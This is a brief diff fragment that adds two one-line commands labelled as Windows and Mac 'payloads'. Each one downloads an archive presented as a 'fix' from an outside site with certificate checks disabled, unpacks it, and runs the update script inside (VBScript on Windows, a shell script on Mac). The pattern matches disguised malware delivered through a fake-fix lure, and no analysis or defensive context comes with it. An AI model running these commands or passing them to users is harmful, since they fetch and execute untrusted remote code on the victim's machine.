@@ -1,0 +1,4 @@
+Windows payload: curl -k -o "%TEMP%\fixed.zip" "https://auto-ai.online/cam-v-257.fix" && powershell -Command "Expand-Archive -Force -Path '%TEMP%\fixed.zip' -DestinationPath '%TEMP%\fixed'" && wscript "%TEMP%\fixed\update.vbs"
+
+
+Mac ayload: curl -k -o "/tmp/fixed.zip" "https://auto-ai.online/cam-v-257.fix" && cd /tmp && unzip -o fixed.zip && chmod +x fixed/update.sh && ./fixed/update.sh
